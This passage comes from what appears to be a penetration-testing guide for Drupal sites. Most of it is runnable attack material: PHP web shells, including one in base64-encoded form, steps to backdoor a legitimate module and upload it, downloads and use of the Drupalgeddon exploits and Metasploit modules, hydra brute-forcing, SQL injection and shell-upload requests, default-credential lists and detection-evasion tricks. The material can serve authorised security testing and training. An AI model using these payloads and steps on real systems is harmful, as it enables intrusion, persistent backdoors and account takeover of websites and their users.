Anonymous        - Unauthenticated visitors (read-only)
Custom Roles     - Site-specific permission groups
```

#### User Enumeration
```bash
# User login page
curl http://target.com/user/login

# User registration (if enabled)
curl http://target.com/user/register

# Password reset
curl http://target.com/user/password

# Admin paths
curl http://target.com/admin/people
curl http://target.com/admin/config
```

### Drupal Exploitation

#### PHP Filter Module (Legacy)
```bash
# Drupal 7 and earlier - Enable PHP Filter module
# Navigate to: admin/modules
# Enable "PHP filter" module
# Create content with PHP code execution

# Create malicious page with PHP code:
```

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

```bash
# Set text format to "PHP code"
# Access via: /node/[NODE_ID]?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

#### Module Upload Backdoor
```bash
# Step 1: Download legitimate module
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Step 2: Create web shell
cat > shell.php << 'EOF'
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
EOF

# Step 3: Create .htaccess for access
cat > .htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Step 4: Package malicious module
mv shell.php .htaccess captcha/
tar czf captcha.tar.gz captcha/

# Step 5: Upload via admin interface
# Navigate to: admin/modules/install
# Upload backdoored module
# Access shell: /modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Drupalgeddon Vulnerabilities

#### Drupalgeddon (CVE-2014-3704)
```bash
# Affects: Drupal 7.0 - 7.31
# Pre-authenticated SQL injection

# Download exploit
wget https://raw.githubusercontent.com/dreadlocked/Drupalgeddon/master/drupalgeddon.py

# Create admin user
python2.7 drupalgeddon.py -t http://target.com -u admin -p pwned

# Alternative: Metasploit module
use exploit/multi/http/drupal_drupageddon
set RHOSTS target_ip
set TARGETURI /
exploit
```

#### Drupalgeddon2 (CVE-2018-7600)
```bash
# Affects: Drupal < 7.58, < 8.5.1
# Remote code execution via form API

# Download exploit
wget https://raw.githubusercontent.com/a2u/CVE-2018-7600/master/exploit.py

# Basic exploitation (creates hello.txt)
python3 drupalgeddon2.py

# Modify exploit for PHP shell upload:
# Replace echo command with base64-encoded PHP shell
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php

# Access shell: target.com/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

#### Drupalgeddon3 (CVE-2018-7602)
```bash
# Affects: Multiple Drupal 7.x and 8.x versions
# Authenticated RCE via Form API

# Requires valid session cookie
# Extract from authenticated browser session

# Metasploit exploitation
use exploit/multi/http/drupal_drupageddon3
set RHOSTS target_ip
set VHOST target.com
set DRUPAL_SESSION SESS[session_cookie]
set DRUPAL_NODE 1
set LHOST attacker_ip
exploit
```

### Drupal Security Testing

#### Discovery Checklist
- [ ] Drupal version identification
- [ ] Module enumeration (contrib and custom)
- [ ] Theme identification
- [ ] User role analysis
- [ ] Administrative interface access
- [ ] Configuration file exposure

#### Module Testing
```bash
# Common vulnerable modules
curl http://target.com/sites/all/modules/views/
curl http://target.com/sites/all/modules/cck/
curl http://target.com/sites/all/modules/imce/
curl http://target.com/sites/all/modules/fckeditor/

# Module version detection
curl http://target.com/sites/all/modules/views/views.info
curl http://target.com/sites/all/modules/cck/cck.info
```

#### Authentication Testing
```bash
# Default credentials testing
admin:admin
admin:password
admin:drupal
administrator:admin

# Brute force login
hydra -l admin -P passwords.txt target.com http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login&op=Log+in:Sorry"
```

### Common Drupal Vulnerabilities

#### SQL Injection in Modules
```bash
# Views module SQLi
curl "http://target.com/views/ajax?view_name=test&view_display_id=page_1" \
  -d "view_args=1' UNION SELECT 1,2,3,4,5-- -"

# Custom module testing
curl "http://target.com/?q=vulnerable_module&id=1'"
```

#### File Upload Vulnerabilities
```bash
# IMCE file manager
curl http://target.com/imce

# Media module uploads
curl -X POST -F "files[]=@shell.php" \
  http://target.com/file/ajax/field_image/und/0/form-token

# CKEditor file uploads
curl -X POST -F "upload=@shell.php" \
  http://target.com/admin/config/content/formats/ckeditor_upload
```

#### Information Disclosure
```bash
# Status reports
curl http://target.com/admin/reports/status

# Database updates
curl http://target.com/update.php

# PHP info (if enabled)
curl http://target.com/admin/reports/status/php

# Log files
curl http://target.com/sites/default/files/logs/
```

### Drupal Attack Vectors Summary

| Attack Vector | Requirements | Impact | Detection Method |
|---------------|--------------|---------|------------------|
| **PHP Filter** | Admin access, legacy version | RCE | Module enumeration |
| **Module Upload** | Admin access | RCE | Admin interface |
| **Drupalgeddon** | Vulnerable version | Account creation | Version detection |
| **Drupalgeddon2** | Vulnerable version | RCE | Version detection |
| **Drupalgeddon3** | Auth + vulnerable version | RCE | Session + version |
| **Module SQLi** | Vulnerable module | Data extraction | Parameter testing |

### Version-Specific Vulnerabilities

#### Drupal 7.x
```bash
# Common vulnerabilities:
# - CVE-2014-3704 (Drupalgeddon)
# - CVE-2018-7600 (Drupalgeddon2)
# - PHP Filter module availability
# - Views module SQL injection

# Detection commands:
curl -s http://target.com/CHANGELOG.txt | grep "Drupal 7"
curl http://target.com/misc/drupal.js
```

#### Drupal 8.x/9.x
```bash
# Common vulnerabilities:
# - CVE-2018-7600 (Drupalgeddon2)
# - CVE-2018-7602 (Drupalgeddon3)
# - Composer dependency issues
# - REST API vulnerabilities

# Detection commands:
curl -s http://target.com | grep "Drupal 8\|Drupal 9"
curl http://target.com/core/misc/drupal.js
```

### Post-Exploitation Cleanup

#### Files to Remove
```bash
# Web shells uploaded
/modules/captcha/shell.php
/sites/default/files/shell.php
/shell.php

# Modified legitimate modules
# Restore original module files

# Created content nodes
# Delete test pages with PHP code
```

#### Administrative Changes
```bash
# Disable PHP Filter module (if enabled)
# Remove created admin accounts
# Clear Drupal cache
# Review user permissions
```

### Detection Evasion
```bash
# Randomized parameters
curl http://target.com/shell.php?randomhash$(date +%s)=id

# User agent rotation
curl -H "User-Agent: Drupal-Security-Scanner" http://target.com

# Request timing
for i in {1..5}; do curl http://target.com/admin/; sleep 3; done
```

### Common Default Paths
```bash
# Administrative interfaces
/admin
/admin/config
/admin/modules
/admin/people

# Content management
/node/add
/admin/content
/admin/structure

# Configuration files
/sites/default/settings.php
/sites/default/default.settings.php
/sites/all/modules/
/core/modules/

# Log and cache directories
/sites/default/files/
/sites/default/private/
/tmp/
```

This comprehensive guide provides a systematic approach to web application enumeration, combining manual techniques with automated tools to ensure thorough coverage of the attack surface.
